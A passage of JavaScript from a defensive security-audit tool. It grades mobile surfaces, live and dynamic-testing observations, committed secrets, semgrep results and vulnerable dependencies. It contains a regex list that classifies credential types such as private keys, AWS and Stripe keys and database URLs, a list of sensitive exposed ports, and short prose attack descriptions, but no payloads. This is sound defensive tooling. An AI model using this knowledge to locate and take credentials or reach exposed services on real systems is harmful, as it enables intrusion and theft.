  for (const gap of model.discovery?.mobile?.frameworkGaps || []) {
    ledger.record('ungradedSurfaces', `mobile-framework:${gap.framework}`, 'undeterminable', gap.reason)
  }

  // Native and Dart source, and the Android build config. THE LARGEST HOLE the mobile audit found:
  // `CODE_EXT` has no `.kt`, `.java`, `.swift`, `.m` or `.dart`, so an app whose live Stripe key,
  // `addJavascriptInterface` bridge, plaintext token store and token logging all sat in
  // MainActivity.kt and AppDelegate.swift produced `findings: []`, `verdict: clean`,
  // `ungradedSurfaces: 0` — a report that reads as an examined-and-clean mobile app. One row per
  // CLASS, because the honest statement is about the class, not about each file.
  const NATIVE_SOURCE_CLASSES = [
    ['kotlinJava', 'Kotlin/Java', 'hardcoded keys, WebView bridges (addJavascriptInterface, loadUrl with intent data), plaintext SharedPreferences, and tokens written to Log.*', 'checks/android.md'],
    ['swiftObjc', 'Swift/Objective-C', 'hardcoded keys, secrets in UserDefaults instead of the Keychain, URL-scheme handlers that act on their parameters, and values printed with print/NSLog', 'checks/ios.md'],
    ['dart', 'Dart', 'hardcoded keys and http:// endpoints — everything in the Dart bundle ships to the device and is readable', 'checks/android.md and checks/ios.md'],
    ['androidResValues', 'Android resource value', 'API keys and backend credentials pasted into strings.xml, which are compiled into the APK and extractable with `strings`', 'checks/android.md'],
    ['gradleConfig', 'Gradle build config', 'signing passwords and keystore paths in gradle.properties, and debug settings that survive into the release variant', 'checks/android.md'],
  ]
  for (const [key, label, what, ref] of NATIVE_SOURCE_CLASSES) {
    const list = model.artifacts?.nativeSource?.[key] || []
    if (!list.length) continue
    ledger.record('ungradedSurfaces', `native-source:${key}`, 'undeterminable',
      `${list.length} ${label} file${list.length === 1 ? '' : 's'} (e.g. ${list.slice(0, 3).join(', ')}) — the static tier does not read them; review against ${ref} for ${what}`)
  }

  // Manifest surfaces the engine now models and no rule grades. Permission SCOPE is a judgement
  // about what the app is for, and a deep link's danger is in the handler the manifest only points
  // at — but both were previously invisible, which is the one output grade-or-declare forbids.
  for (const man of model.mobile?.android || []) {
    if (NON_RELEASE_SOURCE_SETS.has(man.sourceSet)) continue
    const perms = man.usesPermissions || []
    if (perms.length) {
      ledger.record('ungradedSurfaces', `android-permissions:${man.file}`, 'undeterminable',
        `declares ${perms.length} permission${perms.length === 1 ? '' : 's'} (${perms.slice(0, 4).map(p => p.name).join(', ')}${perms.length > 4 ? ', …' : ''}) — the static tier does not grade permission scope; confirm each one is required by a feature the app actually ships`)
    }
    const links = (man.exportedComponents || []).flatMap(c => (c.deepLinks || []).map(d => ({ ...d, c })))
    if (links.length) {
      ledger.record('ungradedSurfaces', `android-deep-links:${man.file}`, 'undeterminable',
        `${links.length} deep-link intent-filter${links.length === 1 ? '' : 's'} (${[...new Set(links.map(d => `${d.scheme || '*'}://${d.host || '*'}`))].slice(0, 4).join(', ')}) — a custom scheme is claimable by any other app on the device; read each handler and confirm it validates the URL before acting on it (checks/android.md, "Deep-link / intent redirection")`)
    }
  }

  for (const pl of model.mobile?.ios || []) {
    if (pl.urlSchemes?.length) {
      ledger.record('ungradedSurfaces', `ios-url-schemes:${pl.file}`, 'undeterminable',
        `declares the custom URL scheme${pl.urlSchemes.length === 1 ? '' : 's'} ${pl.urlSchemes.join(', ')} — any other app on the device can claim and invoke ${pl.urlSchemes.length === 1 ? 'it' : 'them'}; read the handler and confirm it validates parameters before performing an action (checks/ios.md, "URL schemes & universal links")`)
    }
  }
}

// ---------------------------------------------------------------------------
// Live and DAST observations
//
// The probes observe; they do not judge. Each observation names a `kind`, and the mapping from
// kind to severity lives here with everything else.
// ---------------------------------------------------------------------------

const OBSERVATION_POLICY = {
  'no-https': {
    sev: 'P2', evidence: 'definitive', id: 'CG-LIVE-TLS',
    title_en: 'Site is served over plain HTTP', title_he: 'האתר מוגש ב-HTTP לא מוצפן',
    exploit: 'Anyone on the same network reads and rewrites the traffic, including session cookies.',
    impact: 'Session theft and content tampering for every visitor on an untrusted network.',
    guard: 'guard-recipes/security-headers.md#tls', cwe: 'CWE-319',
  },
  'missing-hsts': {
    sev: 'P3', evidence: 'definitive', id: 'CG-LIVE-HSTS',
    title_en: 'No Strict-Transport-Security header', title_he: 'חסרה כותרת Strict-Transport-Security',
    exploit: 'A first visit over HTTP can be downgraded before the redirect to HTTPS happens.',
    impact: 'A narrow but real window for interception on each new device.',
    guard: 'guard-recipes/security-headers.md#hsts',
  },
  'missing-csp': {
    sev: 'P2', evidence: 'definitive', id: 'CG-LIVE-CSP',
    title_en: 'No Content-Security-Policy header', title_he: 'חסרה כותרת Content-Security-Policy',
    exploit: 'Any injected script runs with no restriction on where it may send data.',
    impact: 'Turns a small injection bug into full account takeover.',
    guard: 'guard-recipes/security-headers.md#csp', cwe: 'CWE-693', autofixable: true,
  },
  'missing-nosniff': {
    sev: 'P3', evidence: 'definitive', id: 'CG-LIVE-XCTO',
    title_en: 'No X-Content-Type-Options: nosniff', title_he: 'חסרה כותרת X-Content-Type-Options',
    exploit: 'A browser guesses the type of an uploaded file and executes it as script.',
    impact: 'Uploads become an injection path.',
    guard: 'guard-recipes/security-headers.md#nosniff', autofixable: true,
  },
  'clickjacking': {
    sev: 'P3', evidence: 'definitive', id: 'CG-LIVE-XFO',
    title_en: 'Page can be framed by any site', title_he: 'ניתן להטמיע את הדף באתר כלשהו',
    exploit: 'An attacker frames your page invisibly and tricks a logged-in user into clicking through it.',
    impact: 'Unintended actions performed by real users on their own accounts.',
    guard: 'guard-recipes/security-headers.md#frame-ancestors', cwe: 'CWE-1021', autofixable: true,
  },
  'missing-referrer-policy': {
    sev: 'P3', evidence: 'definitive', id: 'CG-LIVE-REF',
    title_en: 'No Referrer-Policy header', title_he: 'חסרה כותרת Referrer-Policy',
    exploit: 'Full URLs, including tokens placed in query strings, leak to third-party sites.',
    impact: 'Quiet disclosure of anything you put in a URL.',
    guard: 'guard-recipes/security-headers.md#referrer', autofixable: true,
  },
  'unsafe-cors': {
    sev: 'P2', evidence: 'definitive', id: 'CG-LIVE-CORS',
    title_en: 'CORS allows any origin together with credentials', title_he: 'הגדרת CORS מתירה כל מקור יחד עם פרטי הזדהות',
    exploit: 'Any website reads authenticated responses from your API using a visitor\'s own session.',
    impact: 'Cross-site data theft from logged-in users.',
    guard: 'guard-recipes/security-headers.md#cors', cwe: 'CWE-942',
  },
  'cookie-no-httponly': {
    sev: 'P2', evidence: 'definitive', id: 'CG-LIVE-COOKIE',
    title_en: 'A cookie is set without HttpOnly', title_he: 'עוגייה נשלחת ללא HttpOnly',
    exploit: 'Any injected script reads the cookie with document.cookie.',
    impact: 'A single XSS becomes a stolen session.',
    guard: 'guard-recipes/security-headers.md#cookies', cwe: 'CWE-1004', autofixable: true,
  },
  'cookie-no-secure': {
    sev: 'P3', evidence: 'definitive', id: 'CG-LIVE-COOKIE2',
    title_en: 'A cookie is set without Secure', title_he: 'עוגייה נשלחת ללא Secure',
    exploit: 'The cookie is sent over plain HTTP if a request ever downgrades.',
    impact: 'Session disclosure in the downgrade window.',
    guard: 'guard-recipes/security-headers.md#cookies', autofixable: true,
  },
  'exposed-path': {
    sev: 'P1', evidence: 'definitive', id: 'CG-LIVE-EXPOSE',
    title_en: 'A sensitive path is publicly readable', title_he: 'נתיב רגיש קריא לכולם',
    exploit: 'An attacker fetches the path directly and reads its contents.',
    impact: 'Depends on the file, but this class of path usually holds configuration or credentials.',
    guard: 'guard-recipes/ci-hardening.md#exposed-files', cwe: 'CWE-538',
  },
  'anon-read': {
    sev: 'P0', evidence: 'definitive', id: 'CG-LIVE-RLS',
    title_en: 'Anonymous key returned rows from a table', title_he: 'מפתח אנונימי החזיר שורות מהטבלה',
    exploit: 'An attacker runs the same query with the anon key from your bundle and reads the table.',
    impact: 'Total exposure of the table\'s contents. This was proven against the live system, not inferred.',
    guard: 'guard-recipes/rls-policies.md#enable-rls', cwe: 'CWE-284', owasp: 'A01:2021',
  },
  'reflected-xss': {
    sev: 'P1', evidence: 'definitive', id: 'CG-DAST-XSS',
    title_en: 'Injected markup was reflected unescaped', title_he: 'תגית שהוזרקה הוחזרה ללא בריחה',
    exploit: 'An attacker sends a victim a link containing script that runs on your origin.',
    impact: 'Session theft and actions performed as the victim.',
    guard: 'guard-recipes/zod-validation.md#output-encoding', cwe: 'CWE-79', owasp: 'A03:2021',
  },
  'sql-error-leak': {
    sev: 'P1', evidence: 'strong', id: 'CG-DAST-SQLI',
    title_en: 'A quote character produced a database error', title_he: 'תו גרש יצר שגיאת מסד נתונים',
    exploit: 'The input reaches SQL unparameterised, so an attacker rewrites the query.',
    impact: 'Read or modify anything the database user can reach.',
    guard: 'guard-recipes/zod-validation.md#parameterised-queries', cwe: 'CWE-89', owasp: 'A03:2021',
    assumption: 'That the error comes from query construction rather than from a validation layer rejecting the character.',
  },
  'open-redirect': {
    sev: 'P2', evidence: 'definitive', id: 'CG-DAST-REDIR',
    title_en: 'Endpoint redirects to an attacker-supplied host', title_he: 'נקודת הקצה מפנה לדומיין בשליטת תוקף',
    exploit: 'A phishing link starts on your trusted domain and lands on the attacker\'s.',
    impact: 'Your domain lends its credibility to a phishing page.',
    guard: 'guard-recipes/security-headers.md#redirects', cwe: 'CWE-601',
  },

  // ---- business logic ------------------------------------------------------
  //
  // THE CEILING, and it is the entire reason this tier is safe to ship. Every entry below is
  // `evidence: 'judgement'` and `provenance: 'reviewer'`, so confidence is `likely` and can NEVER be
  // `confirmed`: the tool did not PROVE the app's intent, it checked code against a STATED intent,
  // and either could be wrong. Severity stays uncapped (impact-if-true) because the verdict counts
  // only confirmed findings, so none of these can turn the badge red.
  //
  // An assertion below this table re-checks the cap at module load, because a future edit that
  // "upgrades" one of these to `strong` would silently let a guess about business rules move the
  // headline verdict.
  'bl-object-level-authz': {
    sev: 'P1', evidence: 'judgement', provenance: 'reviewer', id: 'CG-BIZ-001',
    title_en: 'A user can reach a record the intent says belongs to someone else',
    title_he: 'משתמש יכול להגיע לרשומה שלפי הכוונה שייכת למישהו אחר',
    exploit: 'A signed-in user changes the id in the request and reads or edits another user\'s row.',
    impact: 'Every row of this resource is reachable by any caller who can guess an id.',
    guard: 'guard-recipes/auth-middleware.md#ownership-check', cwe: 'CWE-639', owasp: 'A01:2021',
    assumption: 'That the stated ownership model is correct, and that the check is not performed in a helper or an ORM call this pass does not follow.',
  },
  'bl-wrong-owner-column': {
    sev: 'P1', evidence: 'judgement', provenance: 'reviewer', id: 'CG-BIZ-002',
    title_en: 'Ownership is checked against a column the intent does not name as the owner',
    title_he: 'בדיקת הבעלות מתבצעת מול עמודה שאינה עמודת הבעלים לפי הכוונה',
    exploit: 'A user in the same team or organisation reads rows the intent says belong to one person.',
    impact: 'A cross-user read that passes review, because the code visibly filters something.',
    guard: 'guard-recipes/auth-middleware.md#ownership-check', cwe: 'CWE-639', owasp: 'A01:2021',
    assumption: 'That the intent names the right owning column, and that the filter seen here is the one that governs the query.',
  },
  'bl-function-level-authz': {
    sev: 'P1', evidence: 'judgement', provenance: 'reviewer', id: 'CG-BIZ-003',
    title_en: 'An operation the intent reserves for another role is reachable',
    title_he: 'פעולה שהכוונה שומרת לתפקיד אחר נגישה למשתמש רגיל',
    exploit: 'A signed-in user calls the endpoint directly and performs an operation the UI never offers them.',
    impact: 'Whatever the restricted operation does — issuing refunds, writing invoices, changing records the system owns.',
    guard: 'guard-recipes/auth-middleware.md#role-check', cwe: 'CWE-285', owasp: 'A01:2021',
    assumption: 'That the role check is not performed in a helper or middleware this pass does not follow, and that this endpoint is not driven by the system (list it under system_routes if it is).',
  },
  'bl-state-transition-authz': {
    sev: 'P1', evidence: 'judgement', provenance: 'reviewer', id: 'CG-BIZ-004',
    title_en: 'A user-reachable route drives a state change the intent reserves for someone else',
    title_he: 'נתיב שנגיש למשתמש מבצע שינוי מצב שהכוונה שומרת לגורם אחר',
    exploit: 'A user calls the endpoint and moves the record into a state only the system was meant to set — marking an order paid without paying.',
    impact: 'The workflow the business depends on can be short-circuited from the browser.',
    guard: 'guard-recipes/business-logic-intent.md#state-transitions', cwe: 'CWE-840', owasp: 'A01:2021',
    assumption: 'That this route is reachable by a user rather than being the webhook or job the intent means; list it under system_routes if it is.',
  },
  'bl-tenant-isolation': {
    sev: 'P1', evidence: 'judgement', provenance: 'reviewer', id: 'CG-BIZ-005',
    title_en: 'A query on a tenant-scoped resource does not filter the tenant column',
    title_he: 'שאילתה על משאב מרובה-דיירים אינה מסננת את עמודת הדייר',
    exploit: 'A user of one organisation reads or edits rows belonging to another organisation.',
    impact: 'Cross-customer data exposure — the failure a B2B app cannot survive.',
    guard: 'guard-recipes/auth-middleware.md#ownership-check', cwe: 'CWE-639', owasp: 'A01:2021',
    assumption: 'That tenant scoping is not applied by a helper, a view, or an RLS policy this pass could not read.',
  },
  'bl-value-tampering': {
    sev: 'P1', evidence: 'judgement', provenance: 'reviewer', id: 'CG-BIZ-006',
    title_en: 'A value the intent does not let a user set is read from the request body',
    title_he: 'ערך שהמשתמש אינו אמור לקבוע נקרא מגוף הבקשה',
    exploit: 'The caller sends their own price, total or quantity and the server stores it.',
    impact: 'Money. An order priced by the buyer, or a balance the client chooses.',
    guard: 'guard-recipes/zod-validation.md#pick-allowed-fields', cwe: 'CWE-472', owasp: 'A04:2021',
    assumption: 'That the value is not recomputed or overwritten server-side after being read, which this pass does not follow.',
  },
  'bl-mass-assignment': {
    sev: 'P1', evidence: 'judgement', provenance: 'reviewer', id: 'CG-BIZ-007',
    title_en: 'The whole request body is written to the database with no field allowlist',
    title_he: 'כל גוף הבקשה נכתב למסד הנתונים ללא רשימת שדות מותרים',
    exploit: 'The caller adds a field the form never showed — role, owner_id, status — and it is written with the rest.',
    impact: 'Privilege escalation and record takeover through a field nobody meant to expose.',
    guard: 'guard-recipes/zod-validation.md#pick-allowed-fields', cwe: 'CWE-915', owasp: 'A04:2021',
    assumption: 'That the object being spread was not already narrowed to safe fields by a validator this pass did not follow.',
  },
  // `bl-intent-unconfirmed` DELIBERATELY HAS NO POLICY, and must never be given one.
  //
  // It had one. Being `judgement` it capped at `likely` and so could not turn the badge red — that
  // much was reasoned correctly. But it still printed `CG-BIZ-010 P2` in the findings list of every
  // repository with no `claudeguard.intent.yml`, which is every repository on its first run. The
  // tool reported a security finding because the user had not written an optional config file yet.
  // Every cry-wolf test in the suite caught it the moment the layer was wired in.
  //
  // Nothing about the app is wrong in that situation; something about OUR KNOWLEDGE of it is, and
  // that is a coverage limitation. `gradeBusinessLogic` records it as an `undeterminable` row and
  // the report carries `businessLogic.status`, the assumptions list and a proposed intent file, so
  // the section can never be mistaken for a confirmed clean result. A missing config file is not a
  // vulnerability, and a finding list that says otherwise trains people to skim past the real ones.

  // ---- dynamic testing (Tier 2/3, behind the gate in dynamic_gate.mjs) --------------------
  //
  // These five are the reason dynamic testing is worth the liability it carries. A working PoC is
  // the DEFINITIVE evidence a static heuristic can never have, so it is the honest route to
  // `confirmed` for exactly the classes the static engine can only call `likely` or
  // `needs-review` — "an auth call is present but may not gate the handler" becomes "an
  // unauthenticated request returned another principal's record". Nothing was argued into a
  // higher confidence; better evidence was fetched, which is the only route the model allows.
  //
  // They are only reachable through the gate. A tool the gate refused produces no observation at
  // all — it produces a `scanCoverage` row in gradeScanners saying which tool was refused and why.
  'exploited-sqli': {
    sev: 'P0', evidence: 'definitive', id: 'CG-DAST-SQLI-POC',
    title_en: 'SQL injection proved with a working payload', title_he: 'הזרקת SQL הוכחה עם payload עובד',
    exploit: 'An attacker sends the same payload and reads, changes or deletes anything the database user can reach.',
    impact: 'The database is readable and writable by anyone who finds this parameter. This was proven against the running system, not inferred from the code.',
    guard: 'guard-recipes/zod-validation.md#parameterised-queries', cwe: 'CWE-89', owasp: 'A03:2021',
  },
  'exploited-idor': {
    sev: 'P0', evidence: 'definitive', id: 'CG-DAST-IDOR-POC',
    title_en: 'Another user\'s record was fetched by changing an id', title_he: 'רשומה של משתמש אחר נשלפה על ידי שינוי מזהה',
    exploit: 'An attacker increments the id in the URL and reads every other account\'s data.',
    impact: 'Every record of this type belongs to whoever asks for it. A live request returned a record the caller does not own.',
    guard: 'guard-recipes/auth-middleware.md#ownership-check', cwe: 'CWE-639', owasp: 'A01:2021',
  },
  'exploited-xss': {
    sev: 'P1', evidence: 'definitive', id: 'CG-DAST-XSS-POC',
    title_en: 'Injected script executed in the page', title_he: 'סקריפט שהוזרק רץ בדף',
    exploit: 'An attacker sends a victim a link whose script runs on your origin with the victim\'s session.',
    impact: 'Session theft and actions performed as the victim. The script was observed executing, not merely reflected.',
    guard: 'guard-recipes/zod-validation.md#output-encoding', cwe: 'CWE-79', owasp: 'A03:2021',
  },
  'auth-bypass-confirmed': {
    sev: 'P0', evidence: 'definitive', id: 'CG-DAST-AUTHZ-POC',
    title_en: 'A protected endpoint answered without authentication', title_he: 'נקודת קצה מוגנת ענתה ללא אימות',
    exploit: 'An attacker calls the endpoint with no session at all and gets the protected response.',
    impact: 'Whatever the endpoint guards is not guarded. This resolves a route the static tier could only mark undeterminable.',
    guard: 'guard-recipes/auth-middleware.md', cwe: 'CWE-306', owasp: 'A01:2021',
  },
  'exposed-service': {
    // Severity is decided per port by `refineExposedService`, because one flat severity here would
    // either cry wolf on every site (port 443 is a web server doing its job) or shrug at a
    // world-readable database. Both failures are the same failure: a severity that does not track
    // what the attacker gets.
    sev: 'P3', evidence: 'definitive', id: 'CG-LIVE-EXPOSE-SVC',
    title_en: 'A network service is reachable from outside', title_he: 'שירות רשת נגיש מבחוץ',
    exploit: 'An attacker connects to the port directly, without going through your application.',
    impact: 'Depends on the service. Anything that is not your web server is an extra way in.',
    guard: 'guard-recipes/container-iac.md#compose-exposure', cwe: 'CWE-1327',
    refine: refineExposedService,
  },
}

/**
 * Ports whose job is to answer the public. An open 443 is the site working, and reporting it would
 * put a confirmed finding on every target ClaudeGuardIL is ever pointed at — the cry-wolf failure
 * that teaches this audience to close the report.
 */
const EXPECTED_PUBLIC_PORTS = new Set([80, 443])

/**
 * Ports that should essentially never answer the open internet. Impact-if-true here is a database,
 * a cache, an orchestrator or a remote desktop with no application in front of it.
 */
const SENSITIVE_PORTS = new Set([
  1433, 1521, 3306, 5432, 5984, 6379, 9042, 9200, 9300, 11211, 27017, 27018,  // data stores
  2375, 2376, 2379, 6443, 10250,                                              // container / cluster control planes
  3389, 5900, 623,                                                            // remote desktop / lights-out management
  5601, 15672,                                                                // admin consoles
])

function portOf(observation) {
  if (Number.isInteger(observation?.port)) return observation.port
  const m = /(?:^|[/:])(\d{1,5})$/.exec(String(observation?.subject ?? ''))
  return m ? Number(m[1]) : null
}

function refineExposedService(o) {
  const port = portOf(o)
  if (port !== null && EXPECTED_PUBLIC_PORTS.has(port)) {
    return { allowlist: `port ${port} answering is the web server doing its job, not an exposure` }
  }
  if (port !== null && SENSITIVE_PORTS.has(port)) {
    return {
      sev: 'P1',
      title_en: `A data or control-plane service is reachable on port ${port}`,
      title_he: `שירות נתונים או ניהול נגיש בפורט ${port}`,
      exploit: `An attacker connects to port ${port} directly and talks to the service without passing through your application or its authorization.`,
      impact: 'Your application\'s access rules are irrelevant to someone who can reach the datastore itself.',
    }
  }
  return {}
}

// The ceiling, asserted at module load. `judgement` → `likely` is the only mapping that keeps a
// business-logic finding out of the headline verdict, and `reviewer` is what tells the reader that a
// judgement — not a proof — is behind it. A change that breaks either fails here, loudly, instead of
// quietly shipping a guess as a certainty.
for (const [kind, p] of Object.entries(OBSERVATION_POLICY)) {
  if (!kind.startsWith('bl-')) continue
  if (p.evidence !== 'judgement' || p.provenance !== 'reviewer') {
    throw new Error(`business-logic policy "${kind}" must be evidence:judgement + provenance:reviewer — ` +
      'the tool checked code against a STATED intent and did not prove it, so it can never be confirmed.')
  }
}

function gradeObservations(observations, ledger, findings) {
  ledger.declare('liveObservations')
  for (const o of observations || []) {
    const subject = `observation:${o.tier}:${o.kind}:${o.subject || o.at || 'target'}`
    const base = OBSERVATION_POLICY[o.kind]
    if (!base) {
      ledger.record('liveObservations', subject, 'undeterminable', `no rule owns observation kind "${o.kind}"`)
      continue
    }
    // A `refine` hook lets one kind carry a severity that depends on the observation itself — an
    // open port 443 and an open port 5432 are the same `kind` and nowhere near the same finding.
    // It may only narrow within the policy table; it never authors a confidence, because
    // confidence stays a pure function of evidence.
    const p = base.refine ? { ...base, ...base.refine(o) } : base
    if (p.allowlist) {
      ledger.record('liveObservations', subject, 'allowlisted', p.allowlist)
      continue
    }
    findings.push(finding({
      id: p.id, subject,
      title_en: p.title_en, title_he: p.title_he,
      severity: p.sev, evidence: p.evidence,
      why: o.detail || p.title_en,
      at: o.at ? [{ file: o.at, line: null, snippet: null }] : [],
      exploit: p.exploit, impact: p.impact, guard: p.guard,
      cwe: p.cwe || null, owasp: p.owasp || null,
      autofixable: !!p.autofixable,
      tier: o.tier,
      assumption: p.assumption || null,
    }))
    ledger.record('liveObservations', subject, 'fail', o.detail || o.kind)
  }
}

// ---------------------------------------------------------------------------
// External scanners — secrets, SAST, dependencies
//
// Before this, gitleaks / semgrep / npm-audit each emitted their own JSON and none of it entered
// the ledger. So LAW 2's guarantee — every enumerated subject accounted for — silently excluded
// the entire secret, SAST and dependency surface: a repo with a committed private key could show
// full coverage. Worse, two adapters passed a tool's OWN severity straight through, which is the
// duplicated-severity-policy the rest of v2 exists to remove.
//
// The adapters observe; the grader grades. It owns the P-level, and it decides how much to trust
// each source — which is the honest half, because these tools have very different precision.
// ---------------------------------------------------------------------------

// A committed secret is a VALUE match, not a name match, so it is exactly the case LAW 3 allows to
// justify a P0 — with one caveat: generic/entropy rules match non-secrets often, so they are held
// to `weak`. Classification is by keywords in the rule id, which works for both gitleaks's native
// rule ids and the fallback scanner's.
function classifySecret(rule) {
  const r = String(rule || '').toLowerCase()
  // Publishable-by-design values that scanners still flag. A Google API key is usually a Maps key.
  // The tokens here are SPECIFIC on purpose: matching the bare word "public" would swallow
  // `public-prefixed-secret`, which is the dangerous case, not a publishable one.
  if (/(google.?api|maps|recaptcha|publishable|sentry|posthog|pusher|algolia|vapid)/.test(r)) {
    return { severity: 'P2', evidence: 'weak', nameOnly: false, kind: 'often-public' }
  }
  // Unmistakably privileged: a value of this shape grants real access.
  if (/(private.?key|rsa|openssh|pgp|aws|akia|stripe|service.?role|database|postgres|mysql|mongodb|db-url|\bdsn\b|github|gitlab|slack|twilio|sendgrid|openai|anthropic|\bgcp\b|azure)/.test(r)) {
    return { severity: 'P0', evidence: 'definitive', nameOnly: false, kind: 'privileged' }
  }
  // Ambiguous by name: generic/entropy rules, a bare JWT, or a `NEXT_PUBLIC_*_SECRET` assignment
  // caught by name rather than by value. A real match sometimes, an example or a hash just as
  // often — and the engine's env analysis is the authority on the prefixed case anyway.
  if (/(generic|entropy|jwt|prefixed|token|api.?key|\bkey\b|secret|credential)/.test(r)) {
    return { severity: 'P2', evidence: 'weak', nameOnly: false, kind: 'generic' }
  }
  // A named provider secret we did not specifically list: a single-hop, direct observation.
  return { severity: 'P1', evidence: 'strong', nameOnly: false, kind: 'named' }
}

const SAST_POLICY = {
  ERROR: { severity: 'P2', evidence: 'strong' },
  WARNING: { severity: 'P3', evidence: 'weak' },
  INFO: { severity: 'P4', evidence: 'weak' },
}

const DEP_SEVERITY = { critical: 'P1', high: 'P1', moderate: 'P2', low: 'P3', info: 'P4' }

function gradeScanners(scanners, ledger, findings, allow) {
  if (!scanners) return
  ledger.declare('scanCoverage')

  // ---- secrets ----
  const sec = scanners.secrets
  if (sec) {
    ledger.declare('secrets')
    // Whether we could look PROPERLY is itself a coverage fact. A fallback regex scan never reads
    // git history, so a secret rotated out of the working tree but alive in history is invisible —
    // that limit must be loud, not silent.
    ledger.record('scanCoverage', 'scan:secrets',
      sec.scannedGitHistory ? 'pass' : 'undeterminable',
      sec.scannedGitHistory
        ? 'gitleaks scanned the working tree and git history'
        : `${sec.engine || 'fallback'} scan only — git history was NOT read, so a secret removed from the tree but alive in history would be missed`)

    for (const f of sec.findings || []) {
      const subject = `secret:${f.file}:${f.line}:${f.rule}`
      if (allow.has(subject)) { ledger.record('secrets', subject, 'allowlisted', 'user allowlist'); continue }
      const c = classifySecret(f.rule)
      findings.push(finding({
        id: 'CG-SEC-001', subject,
        title_en: `Possible ${f.rule} committed in ${f.file}`,
        title_he: `ייתכן שנמצא סוד מסוג ${f.rule} בקובץ ${f.file}`,
        severity: c.severity, evidence: c.evidence, nameOnly: c.nameOnly,
        why: c.kind === 'often-public'
          ? `A value matching ${f.rule} is committed here, but keys of this kind are frequently meant to be public.`
          : c.kind === 'generic'
            ? `A value matching the generic rule ${f.rule} is committed here; generic rules match examples and hashes as well as real secrets.`
            : `A value matching ${f.rule} is committed at this location (${f.masked || 'masked'}).`,
        at: firstAt(f.file, f.line, f.masked),
        exploit: 'Anyone who can read the repository — or its history — copies the value and uses it.',
        impact: c.kind === 'privileged'
          ? 'Whatever the credential grants. Rotate it now; a committed secret must be treated as burned even if you delete the line.'
          : 'Depends on what the value is. If it grants access, rotate it; if it is public by design, mark it allowlisted.',
        guard: 'guard-recipes/secrets-management.md#public-prefixes',
        cwe: 'CWE-798', owasp: 'A05:2021', tier: 'static',
        source: sec.engine === 'gitleaks' ? 'gitleaks' : 'fallback-regex',
        autofixable: false,
        assumption: c.kind === 'privileged'
          ? 'That the key is still active. Rotate it regardless — a value in git history is compromised.'
          : 'That this value grants privileged access rather than being a public identifier.',
      }))
      ledger.record('secrets', subject, 'fail', `${f.rule} (${c.kind})`)
    }
  }

  // ---- SAST ----
  const sast = scanners.sast
  if (sast) {
    ledger.declare('sast')
    if (!sast.available || sast.engine === 'none') {
      ledger.record('scanCoverage', 'scan:sast', 'undeterminable',
        'semgrep is not installed — no SAST pass ran; the auditors read the code directly instead')
    } else if (sast.error) {
      ledger.record('scanCoverage', 'scan:sast', 'undeterminable',
        `semgrep ran but produced nothing parseable (${String(sast.error).slice(0, 80)})`)
    } else {
      ledger.record('scanCoverage', 'scan:sast', 'pass', `semgrep produced ${sast.count ?? (sast.findings || []).length} result(s)`)
      for (const f of sast.findings || []) {
        const subject = `sast:${f.file}:${f.line}:${f.rule}`
        if (allow.has(subject)) { ledger.record('sast', subject, 'allowlisted', 'user allowlist'); continue }
        const label = String(f.engineSeverity ?? f.severity ?? 'WARNING').toUpperCase()
        const p = SAST_POLICY[label] || SAST_POLICY.WARNING
        findings.push(finding({
          id: 'CG-SAST-001', subject,
          title_en: `semgrep: ${f.rule}`,
          title_he: `ממצא semgrep: ${f.rule}`,
          severity: p.severity, evidence: p.evidence,
          why: (f.message ? String(f.message).slice(0, 240) : `semgrep rule ${f.rule} matched.`) +
            ' Reported by an external SAST rule, so it is never auto-confirmed.',
          at: firstAt(f.file, f.line),
          exploit: 'See the rule\'s own description; semgrep matched a pattern it associates with this weakness.',
          impact: 'Varies by rule. Treat as a lead for a reviewer, not a proven finding.',
          guard: 'guard-recipes/zod-validation.md',
          tier: 'static', autofixable: false, source: 'semgrep',
          assumption: 'That the semgrep rule matched real behaviour and not a shape that only looks like it.',
        }))
        ledger.record('sast', subject, 'fail', `${f.rule} (${label})`)
      }
    }
  }

  // ---- dependencies ----
  const dep = scanners.dependencies
  if (dep) {
    ledger.declare('dependencies')
    if (!dep.ran) {
      // The adapter's own reason is far more actionable than a generic one: "npm needs a lockfile
      // and this project has none committed" tells the user what to do, where "no auditor was
      // available" sends them looking for a tool they already have.
      const why = (dep.unparsed || []).map(u => u.reason).filter(Boolean)
      ledger.record('scanCoverage', 'scan:dependencies', 'undeterminable',
        why.length ? why.join('; ')
          : 'no dependency auditor was available — the lockfile was not checked against advisories')
    } else {
      // An auditor that ran and produced output we could not read is NOT a completed check. Before
      // audit fix C the adapter emitted pnpm/pip/osv results in their native shapes, the grader's
      // reader found nothing in them, and the row said `pass` — "checked, nothing found" over an
      // ecosystem nobody had actually parsed. A gap has to be louder than a clean result, not
      // quieter.
      const unparsed = dep.unparsed || []
      if (unparsed.length) {
        ledger.record('scanCoverage', 'scan:dependencies', 'undeterminable',
          `a dependency auditor ran but ${unparsed.length} result set(s) could not be read: ` +
          unparsed.map(u => `${u.tool} (${u.reason})`).join('; '))
      } else {
        ledger.record('scanCoverage', 'scan:dependencies', 'pass', 'a dependency auditor ran against the manifest')
      }
      // One package can carry several advisories, and two tools can report the same package. The
      // subject is the package, so the second row would collide — and LAW 2 answers a collision
      // with a throw, which would crash the scan instead of reporting it.
      const seenDeps = new Set()
      for (const res of dep.results || []) {
        for (const v of res.vulnerabilities || []) {
          const subject = `dependency:${res.ecosystem}:${v.name}`
          if (seenDeps.has(subject)) continue
          seenDeps.add(subject)
          if (allow.has(subject)) { ledger.record('dependencies', subject, 'allowlisted', 'user allowlist'); continue }
          const label = String(v.advisorySeverity ?? v.severity ?? 'moderate').toLowerCase()
          findings.push(finding({
            id: 'CG-DEP-001', subject,
            title_en: `Vulnerable dependency: ${v.name} (${label})`,
            title_he: `תלות פגיעה: ${v.name} (${label})`,
            // Impact-if-true is the advisory's severity. Confidence is held down because we did not
            // check reachability — the unreachable-CVE false positive is called out in the method.
            severity: DEP_SEVERITY[label] || 'P3', evidence: 'weak',
            why: `${v.name} has a known advisory (${(v.via || []).slice(0, 2).join('; ') || label}).`,
            at: [],
            exploit: 'An attacker exercises the vulnerable code path in this package.',
            impact: 'Depends on the advisory and on whether your code actually reaches the vulnerable path.',
            guard: 'guard-recipes/dependency-hygiene.md',
            cwe: 'CWE-1104', owasp: 'A06:2021', tier: 'static', autofixable: false,
            source: res.tool || 'dep-audit',
            assumption: 'That the vulnerable code path is actually reached at runtime. Many dependency CVEs sit in code an app never calls.',
          }))
          ledger.record('dependencies', subject, 'fail', `${v.name} (${label})`)
        }
      }
    }
  }

  // ---- dynamic testing ----
  //
